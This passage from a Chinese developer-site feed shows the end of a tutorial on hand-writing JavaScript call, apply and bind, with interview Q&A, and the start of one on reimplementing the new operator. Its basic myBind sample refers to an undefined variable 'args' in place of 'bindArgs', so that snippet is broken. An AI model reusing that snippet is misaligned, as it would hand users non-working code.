    finalContext = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Boolean</span>(context);
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (contextType === <span class="hljs-string">'symbol'</span>) {
    finalContext = <span class="hljs-title class_">Object</span>(context);
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (contextType === <span class="hljs-string">'bigint'</span>) {
    finalContext = <span class="hljs-title class_">Object</span>(context);
  }

  <span class="hljs-comment">// 5. 绑定函数到上下文</span>
  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(finalContext, fnSymbol, {
    <span class="hljs-attr">value</span>: <span class="hljs-variable language_">this</span>,
    <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">writable</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span>
  });

  <span class="hljs-comment">// 6. 执行函数</span>
  <span class="hljs-keyword">let</span> result;
  <span class="hljs-keyword">try</span> {
    result = finalContext[fnSymbol](...args);
  } <span class="hljs-keyword">finally</span> {
    <span class="hljs-comment">// 7. 清理</span>
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">delete</span> finalContext[fnSymbol];
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-comment">// 忽略删除错误</span>
    }
  }

  <span class="hljs-keyword">return</span> result;
};
</code></pre>
<h2 data-id="heading-11">bind 方法的实现</h2>
<h3 data-id="heading-12">bind 的基本使用</h3>
<p>bind 方法创建一个新的函数，当这个新函数被调用时，它的 this 值会被绑定到指定的对象，并且可以预先传入部分参数。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">greeting, name</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${greeting}</span>, <span class="hljs-subst">${name}</span>! 我是<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.role}</span>`</span>);
}

<span class="hljs-keyword">const</span> context = { <span class="hljs-attr">role</span>: <span class="hljs-string">'管理员'</span> };

<span class="hljs-comment">// bind：创建新函数，稍后执行</span>
<span class="hljs-keyword">const</span> boundGreet = greet.<span class="hljs-title function_">bind</span>(context, <span class="hljs-string">'你好'</span>);
<span class="hljs-title function_">boundGreet</span>(<span class="hljs-string">'李四'</span>); 
</code></pre>
<h3 data-id="heading-13">bind 的核心特性：</h3>
<ol>
<li>返回一个新函数</li>
<li>可以预设参数（柯里化）</li>
<li>绑定this值</li>
<li>支持new操作符（特殊情况）</li>
</ol>
<h3 data-id="heading-14">基础版本实现</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">myBind</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">context, ...bindArgs</span>) {
  <span class="hljs-keyword">const</span> fn = <span class="hljs-variable language_">this</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">...newArgs</span>) {
        <span class="hljs-keyword">return</span> fn.<span class="hljs-title function_">apply</span>(context, [...args, ...newArgs]);
    };
};
</code></pre>
<h3 data-id="heading-15">处理 new 操作符的特殊情况</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">myBindEnhanced</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">context = globalThis, ...bindArgs</span>) {
  <span class="hljs-keyword">const</span> originalFunc = <span class="hljs-variable language_">this</span>;

  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> originalFunc !== <span class="hljs-string">'function'</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'Function.prototype.myBindEnhanced called on non-function'</span>);
  }

  <span class="hljs-comment">// 内部函数，用于判断是否被new调用</span>
  <span class="hljs-keyword">const</span> boundFunc = <span class="hljs-keyword">function</span> (<span class="hljs-params">...callArgs</span>) {
    <span class="hljs-comment">// 关键判断：this instanceof boundFunc</span>
    <span class="hljs-comment">// 如果使用new调用，this会是boundFunc的实例</span>
    <span class="hljs-keyword">const</span> isConstructorCall = <span class="hljs-variable language_">this</span> <span class="hljs-keyword">instanceof</span> boundFunc;

    <span class="hljs-comment">// 确定最终的上下文</span>
    <span class="hljs-comment">// 如果是构造函数调用，使用新创建的对象作为this</span>
    <span class="hljs-comment">// 否则使用绑定的context</span>
    <span class="hljs-keyword">const</span> finalContext = isConstructorCall ? <span class="hljs-variable language_">this</span> : <span class="hljs-title class_">Object</span>(context);

    <span class="hljs-comment">// 合并参数</span>
    <span class="hljs-keyword">const</span> finalArgs = bindArgs.<span class="hljs-title function_">concat</span>(callArgs);

    <span class="hljs-comment">// 执行原函数</span>
    <span class="hljs-comment">// 如果原函数有返回值，需要特殊处理</span>
    <span class="hljs-keyword">const</span> result = originalFunc.<span class="hljs-title function_">apply</span>(finalContext, finalArgs);

    <span class="hljs-comment">// 构造函数调用的特殊处理</span>
    <span class="hljs-comment">// 如果原函数返回一个对象，则使用该对象</span>
    <span class="hljs-comment">// 否则返回新创建的对象（this）</span>
    <span class="hljs-keyword">if</span> (isConstructorCall) {
      <span class="hljs-keyword">if</span> (result &amp;&amp; (<span class="hljs-keyword">typeof</span> result === <span class="hljs-string">'object'</span> || <span class="hljs-keyword">typeof</span> result === <span class="hljs-string">'function'</span>)) {
        <span class="hljs-keyword">return</span> result;
      }
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
    }

    <span class="hljs-keyword">return</span> result;
  };

  <span class="hljs-comment">// 维护原型链</span>
  <span class="hljs-comment">// 方法1：直接设置prototype（有缺陷）</span>
  <span class="hljs-comment">// boundFunc.prototype = originalFunc.prototype;</span>

  <span class="hljs-comment">// 方法2：使用空函数中转（推荐）</span>
  <span class="hljs-keyword">const</span> F = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) { };
  F.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = originalFunc.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>;
  boundFunc.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_">F</span>();
  boundFunc.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = boundFunc;

  <span class="hljs-comment">// 添加一些元信息（可选）</span>
  boundFunc.<span class="hljs-property">originalFunc</span> = originalFunc;
  boundFunc.<span class="hljs-property">bindContext</span> = context;
  boundFunc.<span class="hljs-property">bindArgs</span> = bindArgs;

  <span class="hljs-keyword">return</span> boundFunc;
};
</code></pre>
<h3 data-id="heading-16">完整实现与性能优化</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">myBindFinal</span> = (<span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-comment">// 使用闭包保存Slice方法，提高性能</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title class_">ArraySlice</span> = <span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">slice</span>;

  <span class="hljs-comment">// 空函数，用于原型链维护</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">EmptyFunction</span>(<span class="hljs-params"/>) { }

  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">myBindFinal</span>(<span class="hljs-params">context = globalThis, ...bindArgs</span>) {
    <span class="hljs-keyword">const</span> originalFunc = <span class="hljs-variable language_">this</span>;

    <span class="hljs-comment">// 严格的类型检查</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> originalFunc !== <span class="hljs-string">'function'</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'Function.prototype.bind called on non-function'</span>);
    }

    <span class="hljs-comment">// 处理原始值的上下文（非严格模式）</span>
    <span class="hljs-keyword">let</span> boundContext = context;
    <span class="hljs-keyword">const</span> contextType = <span class="hljs-keyword">typeof</span> boundContext;

    <span class="hljs-comment">// 原始值包装（与call/apply保持一致）</span>
    <span class="hljs-keyword">if</span> (contextType === <span class="hljs-string">'string'</span>) {
      boundContext = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(boundContext);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (contextType === <span class="hljs-string">'number'</span>) {
      boundContext = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Number</span>(boundContext);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (contextType === <span class="hljs-string">'boolean'</span>) {
      boundContext = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Boolean</span>(boundContext);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (contextType === <span class="hljs-string">'symbol'</span>) {
      boundContext = <span class="hljs-title class_">Object</span>(boundContext);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (contextType === <span class="hljs-string">'bigint'</span>) {
      boundContext = <span class="hljs-title class_">Object</span>(boundContext);
    }

    <span class="hljs-comment">// 创建绑定函数</span>
    <span class="hljs-keyword">const</span> boundFunction = <span class="hljs-keyword">function</span> (<span class="hljs-params">...callArgs</span>) {
      <span class="hljs-comment">// 判断是否被new调用</span>
      <span class="hljs-keyword">const</span> isConstructorCall = <span class="hljs-variable language_">this</span> <span class="hljs-keyword">instanceof</span> boundFunction;

      <span class="hljs-comment">// 确定最终上下文</span>
      <span class="hljs-keyword">let</span> finalContext;
      <span class="hljs-keyword">if</span> (isConstructorCall) {
        <span class="hljs-comment">// new调用：忽略绑定的context，使用新实例</span>
        finalContext = <span class="hljs-variable language_">this</span>;
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (boundContext == <span class="hljs-literal">null</span>) {
        <span class="hljs-comment">// 非严格模式：使用全局对象</span>
        finalContext = globalThis;
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 普通调用：使用绑定的context</span>
        finalContext = boundContext;
      }

      <span class="hljs-comment">// 合并参数</span>
      <span class="hljs-keyword">const</span> allArgs = bindArgs.<span class="hljs-title function_">concat</span>(callArgs);

      <span class="hljs-comment">// 调用原函数</span>
      <span class="hljs-keyword">const</span> result = originalFunc.<span class="hljs-title function_">apply</span>(finalContext, allArgs);

      <span class="hljs-comment">// 处理构造函数调用的返回值</span>
      <span class="hljs-keyword">if</span> (isConstructorCall) {
        <span class="hljs-comment">// 如果原函数返回对象，则使用该对象</span>
        <span class="hljs-keyword">if</span> (result &amp;&amp; (<span class="hljs-keyword">typeof</span> result === <span class="hljs-string">'object'</span> || <span class="hljs-keyword">typeof</span> result === <span class="hljs-string">'function'</span>)) {
          <span class="hljs-keyword">return</span> result;
        }
        <span class="hljs-comment">// 否则返回新创建的实例</span>
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
      }

      <span class="hljs-keyword">return</span> result;
    };

    <span class="hljs-comment">// 维护原型链 - 高性能版本</span>
    <span class="hljs-comment">// 避免直接修改boundFunction.prototype，使用中间函数</span>
    <span class="hljs-keyword">if</span> (originalFunc.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>) {
      <span class="hljs-title class_">EmptyFunction</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = originalFunc.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>;
      boundFunction.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">EmptyFunction</span>();
      <span class="hljs-comment">// 恢复constructor属性</span>
      boundFunction.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = boundFunction;
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// 处理没有prototype的情况（如箭头函数）</span>
      boundFunction.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-literal">undefined</span>;
    }

    <span class="hljs-comment">// 添加不可枚举的原始函数引用（用于调试）</span>
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(boundFunction, <span class="hljs-string">'__originalFunction__'</span>, {
      <span class="hljs-attr">value</span>: originalFunc,
      <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">writable</span>: <span class="hljs-literal">true</span>
    });

    <span class="hljs-comment">// 添加不可枚举的绑定信息</span>
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(boundFunction, <span class="hljs-string">'__bindContext__'</span>, {
      <span class="hljs-attr">value</span>: boundContext,
      <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">writable</span>: <span class="hljs-literal">true</span>
    });

    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(boundFunction, <span class="hljs-string">'__bindArgs__'</span>, {
      <span class="hljs-attr">value</span>: bindArgs,
      <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">writable</span>: <span class="hljs-literal">true</span>
    });

    <span class="hljs-comment">// 设置适当的函数属性</span>
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(boundFunction, <span class="hljs-string">'length'</span>, {
      <span class="hljs-attr">value</span>: <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">0</span>, originalFunc.<span class="hljs-property">length</span> - bindArgs.<span class="hljs-property">length</span>),
      <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">writable</span>: <span class="hljs-literal">false</span>
    });

    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(boundFunction, <span class="hljs-string">'name'</span>, {
      <span class="hljs-attr">value</span>: <span class="hljs-string">`bound <span class="hljs-subst">${originalFunc.name || <span class="hljs-string">''</span>}</span>`</span>.<span class="hljs-title function_">trim</span>(),
      <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">writable</span>: <span class="hljs-literal">false</span>
    });

    <span class="hljs-keyword">return</span> boundFunction;
  };
})();
</code></pre>
<h2 data-id="heading-17">面试常见问题与解答</h2>
<h3 data-id="heading-18">问题1：手写call的核心步骤是什么？</h3>
<ol>
<li>步骤1:  将函数设为上下文对象的属性</li>
<li>步骤2:  执行该函数</li>
<li>步骤3:  删除该属性</li>
<li>步骤4:  返回函数执行结果</li>
<li>关键点：
<ul>
<li>使用Symbol避免属性名冲突</li>
<li>处理null/undefined上下文</li>
<li>处理原始值上下文</li>
<li>使用展开运算符处理参数</li>
</ul>
</li>
</ol>
<h3 data-id="heading-19">问题2：bind如何处理new操作符？</h3>
<ol>
<li>通过 this instanceof boundFunction 判断是否被new调用</li>
<li>如果是new调用，忽略绑定的上下文，使用新创建的对象作为this</li>
<li>需要正确设置boundFunction的原型链，以支持instanceof</li>
<li>如果原构造函数返回对象，则使用该对象，否则返回新实例</li>
</ol>
<h3 data-id="heading-20">问题3：call、apply、bind的性能差异？</h3>
<ol>
<li>call通常比apply快，因为apply需要处理数组参数</li>
<li>bind创建新函数有开销，但多次调用时比重复call/apply高效</li>
</ol>
<h2 data-id="heading-21">结语</h2>
<p>通过深入理解call、apply、bind的实现原理，我们不仅能更好地回答面试问题，还能在实际开发中编写出更优雅、更高效的JavaScript代码。对于文章中错误的地方或者有任何问题，欢迎在评论区留言讨论！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript 手写 new 操作符：深入理解对象创建]]></title>    <link>https://juejin.cn/post/7605792874173055039</link>    <guid>https://juejin.cn/post/7605792874173055039</guid>    <pubDate>2026-02-13T01:10:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605792874173055039" data-draft-id="7605807405306921023" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScript 手写 new 操作符：深入理解对象创建"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2026-02-13T01:10:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="wuhen_n"/> <meta itemprop="url" content="https://juejin.cn/user/4149996261738233"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScript 手写 new 操作符：深入理解对象创建
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4149996261738233/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    wuhen_n
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T01:10:10.000Z" title="Fri Feb 13 2026 01:10:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>当我们使用 new 关键字时，背后到底发生了什么？这个看似简单的操作，实际上完成了一系列复杂的步骤。理解 new 的工作原理，是掌握 JavaScript 面向对象编程的关键。</p>
</blockquote>
<h2 data-id="heading-0">前言：从 new 的神秘面纱说起</h2>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
}

<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">greet</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-string">`你好，我是<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>，今年<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.age}</span>岁`</span>;
};

<span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">'张三'</span>, <span class="hljs-number">25</span>);
</code></pre>
<p>上述代码中 new 到底创建了什么？为什么 this 指向了新对象？原型链是怎么建立的？如果构造函数有返回值会怎样？我们将通过本篇文章揭开 new 的神秘面纱，从零实现一个自己的 new 操作符。</p>
<h2 data-id="heading-1">理解 new</h2>
<p>new 的四个核心步骤：</p>
<ol>
<li>创建一个空对象</li>
<li>将对象的原型设置为构造函数的 prototype 属性</li>
<li>将构造函数的 this 绑定到新对象，并执行构造函数</li>
<li>判断返回值类型：如果构造函数返回一个对象（包括函数），则返回该对象；否则返回新创建的对象</li>
</ol>
<h2 data-id="heading-2">手写实现 new 操作符</h2>
<h3 data-id="heading-3">基础版本实现</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">myNew</span>(<span class="hljs-params">constructor, ...args</span>) {

  <span class="hljs-comment">// 1. 创建一个空对象</span>
  <span class="hljs-keyword">const</span> obj = {};

  <span class="hljs-comment">// 2. 将对象的原型设置为构造函数的 prototype 属性</span>
  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">setPrototypeOf</span>(obj, constructor.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);

  <span class="hljs-comment">// 3. 将构造函数的 this 绑定到新对象，并执行构造函数</span>
  <span class="hljs-keyword">const</span> result = constructor.<span class="hljs-title function_">apply</span>(obj, args);

  <span class="hljs-comment">// 4. 判断返回值类型</span>
  <span class="hljs-comment">// 如果构造函数返回一个对象（包括函数），则返回该对象</span>
  <span class="hljs-comment">// 否则返回新创建的对象</span>
  <span class="hljs-keyword">const</span> isObject = result !== <span class="hljs-literal">null</span> &amp;&amp; (<span class="hljs-keyword">typeof</span> result === <span class="hljs-string">'object'</span> || <span class="hljs-keyword">typeof</span> result === <span class="hljs-string">'function'</span>);

  <span class="hljs-keyword">return</span> isObject ? result : obj;
}
</code></pre>
<h3 data-id="heading-4">处理边界情况</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">myNewEnhanced</span>(<span class="hljs-params">constructor, ...args</span>) {

  <span class="hljs-comment">// 边界情况1：constructor 不是函数</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> constructor !== <span class="hljs-string">'function'</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">`<span class="hljs-subst">${constructor}</span> is not a constructor`</span>);
  }

  <span class="hljs-comment">// 边界情况2：箭头函数（没有 prototype）</span>
  <span class="hljs-keyword">if</span> (!constructor.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">`<span class="hljs-subst">${constructor.name || constructor}</span> is not a constructor`</span>);
  }

  <span class="hljs-comment">// 1. 创建新对象（改进方法）：使用 Object.create 更优雅地设置原型</span>
  <span class="hljs-keyword">const</span> obj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(constructor.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);

  <span class="hljs-comment">// 2. 调用构造函数</span>
  <span class="hljs-keyword">let</span> result;
  <span class="hljs-keyword">try</span> {
    result = constructor.<span class="hljs-title function_">apply</span>(obj, args);
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-comment">// 如果构造函数抛出异常，直接传播</span>
    <span class="hljs-keyword">throw</span> error;
  }

  <span class="hljs-comment">// 3. 处理返回值</span>
  <span class="hljs-comment">// 注意：null 也是 object 类型，但需要特殊处理</span>
  <span class="hljs-keyword">const</span> resultType = <span class="hljs-keyword">typeof</span> result;
  <span class="hljs-keyword">const</span> isObject = result !== <span class="hljs-literal">null</span> &amp;&amp; (resultType === <span class="hljs-string">'object'</span> || resultType === <span class="hljs-string">'function'</span>);

  <span class="hljs-keyword">return</span> isObject ? result : obj;
}

</code></pre>
<h3 data-id="heading-5">完整实现与原型链优化</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">myNewComplete</span>(<span class="hljs-params">constructor, ...args</span>) {
  <span class="hljs-comment">// 1. 参数验证</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> constructor !== <span class="hljs-string">'function'</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">`Constructor <span class="hljs-subst">${constructor}</span> is not a function`</span>);
  }

  <span class="hljs-comment">// 2. 检查是否为可构造的函数：箭头函数和部分内置方法没有 prototype</span>
  <span class="hljs-keyword">if</span> (!constructor.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> &amp;&amp; !<span class="hljs-title function_">isNativeConstructor</span>(constructor)) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">`<span class="hljs-subst">${getFunctionName(constructor)}</span> is not a constructor`</span>);
  }

